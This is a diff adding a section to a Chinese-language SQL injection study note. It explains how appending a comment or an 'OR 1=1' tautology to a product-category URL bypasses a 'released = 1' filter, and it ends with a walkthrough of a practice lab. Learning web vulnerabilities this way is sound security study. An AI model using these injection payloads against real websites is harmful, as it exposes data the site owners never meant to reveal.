@@ -34,3 +34,41 @@ SQL injection 可以讓攻擊者取得不被允許取得的資訊，包含：密
 * UNION 攻擊，獲得其他資料表的數據。
 * Blind SQL injection：控制查詢結果，但不會回傳數據。
 
+## 取得隱藏的資料
+假設一個購物網站，使用者點擊了 `Gift` 品項，網址就會變成：
+
+```https://insecure-website.com/products?category=Gifts```
+
+此時的 SQL 語句為：
+
+```SELECT * FROM products WHERE category = 'Gifts' AND released = 1```
+
+其中的 `AND released = 1` 假設用意為只回傳上架的商品，避免隱藏的商品被回傳，並假設隱藏的商品的 `released` 值為 `0`。
+
+可以將網址改成：
+
+```https://insecure-website.com/products?category=Gifts' --```
+
+當中的 `--` 為 SQL 中的註解，可忽略之後的內容，
+
+因此後方的 `AND released = 1` 條件就會被忽略
+
+也可以將網址改成：
+
+```https://insecure-website.com/products?category=Gifts'+OR+1=1--```
+
+此時的 SQL 語句就變成：
+
+```SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1```
+
+因為 `1=1` 一直都會是真（true），所以會回傳整個資料表的值。
+
+* Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+  1. 點擊 Gift 選項，觀察網址後方為：`?category=Gifts`
+  2. 為了符合題意：「取得所有未發布的品項」，可以將網址 `category=Gifts%27%20OR%201=1%20--`，通常瀏覽器會自動做 URL 編碼，所以改成 `category=Gifts' OR 1=1 --` 也可以。
+  3. 修改完並重新整理後，就過關了！
+
+  
+  
+
+
